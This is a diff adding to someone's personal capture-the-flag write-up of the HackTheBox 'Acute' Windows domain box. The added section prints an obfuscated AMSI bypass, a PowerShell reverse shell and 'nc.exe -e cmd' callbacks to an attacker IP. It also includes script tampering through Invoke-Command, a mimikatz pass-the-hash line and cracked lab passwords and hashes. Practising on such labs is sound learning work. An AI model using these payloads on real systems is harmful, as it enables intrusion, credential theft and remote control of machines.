@@ -8,6 +8,8 @@ Learnt:
 - Virtual host rounting - in `/etc/hosts subdomain.domain.tld subdomain`
 - Question how service running on server to host the external service?
 - Be throughout - 2/4 - I wanted to test links to much! - Extract all and Test Linearly - Extract and Test.
+- Limited powershell `get-command -> get-alias`
+- Password reuse, password reuse
 
 Had a pretty terrible couple of days, awhile still being healthy and solved some more administrative issues. No boxes were done and I am returningto power through the next exam like 12 hours brutality fun-time-fail-and-fix. One day in one day off. I need a good five hours of fun and practical learning and recall. These streams are great for that as Al is always either two steps ahead of me or I am ahead by a step whiel he is using the other half of his brain to throw out questions, testing the audience and answering questions about relevant cyber security questions.
 [Alh4zr3d](https://www.youtube.com/watch?v=IRSm7kalGPY) stream and after following along I will read 0xDF writeup on this and another from another source.
@@ -171,7 +173,7 @@ The Invoke-Command cmdlet **runs commands on a local or remote computer and retu
 
 The struggle for me came from my screenshotting. Here is the import detail
 ![](configname.png)
-Fortunately honestly and thankfully the logs are here to remind me of the OOF. 
+Fortunately, honestly and thankfully the logs are here to remind me of the OOF. 
 ![](honestyisgood.png)
 Bit testing and playing around. Learnt that a better approach would be to start check what commands you run first. `get-command`
 ![](imonkaswhoami.png)
@@ -229,12 +231,95 @@ invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential 
 Being patient it took like five minutes, still waiting on the reverse shell. VPN is fine, still waiting
 ![](callbackyeeeeeeeah.png)
 
-An hour later the shell that should return did not. A tad upset.
+An hour later the shell that should return did not. A tad upset. I want to finish this up so key take away from best apporach is keeping it simple. Upload a nc.exe to Utils, I copied commands here to avoid the nightmare my own stupidity and misreading/typing/brainusing.
+
+```powershell
+# Login 
+edavies
+Password1!
+Acute-PC01
+# Setup listeners
+echo ":)"
+# Bypass AMSI
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+# Reverse Shell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+# Move to whitelisted directory and download static binary of nc.exe
+cd C:\utils
+wget http://10.10.14.109/nc.exe -outfile nc.exe 
+
+$pass = convertto-securestring -asplaintext -force -string "W3_4R3_th3_f0rce."
+$cred = new-object -typename system.management.automation.pscredential("acute\imonks",$pass)
+
+Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc.exe -e cmd 10.10.14.109 8889') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+
+Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+```
 
 ## PrivEsc
 
+Hurray!
+![1000](jollyPowershellMIGRAINMYorgan.png)
+
+Systeminfo, Nastasha is weird as non list prior and no Lois Hopkins for group membership changing
+![](systeminfo.png)
+
+I ran some enumeration checks just to figure out what was going on the box.
+![](systemlevelservices.png)
+Before uploading any AD enumeration tool or enumerating for AD related stuff.
+![](cdisk.png)
+
+Weird can't re run:
+![](cantrerunregqc.png)
+
+Need to strech and then have more relax hour to finish this one off while I wait for other background stuff to finsih other boxes. From [2:47:34](https://www.youtube.com/watch?v=IRSm7kalGPY&t=10030s)
+
+![](weareadmin.png)
+
+We are only local admin not domain admin. 
+![](transfermimikatz.png)
+
+Important findings
+![](datmarvel.png)
+
+Al could have just used the builtin feature in mimikatz to run commands.
+```powershell
+sekurlsa::pth /user:Adminstrator /domain:ACUTE.local /ntlm:a29f7623fd11550def0192de9246f46b:a29f7623fd11550def0192de9246f46b /run:'C:\utils\nc.exe -e cmd 10.10.14.109 8890'
+```
+
+![](attemptOne.png)
+Delphine says it needs to be run server side, so I assume that given we are in a virtual machine on top of the dc it work overpass the hash.
+
+Al cracks the hashes kindly and performs password reuse attacks, while i tried debugging mimikatz.
+```
+Natasha : 29ab86c5c4d2aab957763e5c1720486d
+Administrator : Password@123 : a29f7623fd11550def0192de9246f46b
+```
+
+Seems like Al is very tired at this point. Migrate my raised eyebrows to 0xDF
+![](passwordreuseissomethingImusttryevenforanycrackedpasswords.png)
+The script that triggered Al
+![](anotherscriptthetriggeral.png)
+
+Always Check custom administrator groups; callback to the Word.doc
+![](customadmingroups.png)
 
 
 
+```powershell
+$pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)
 
-      
+
+Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } 
+
+
+
+Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc.exe -e cmd 10.10.14.109 8890') | sc -Path C:\ } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+
+Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+```
+
+![](acuteawallace.png)
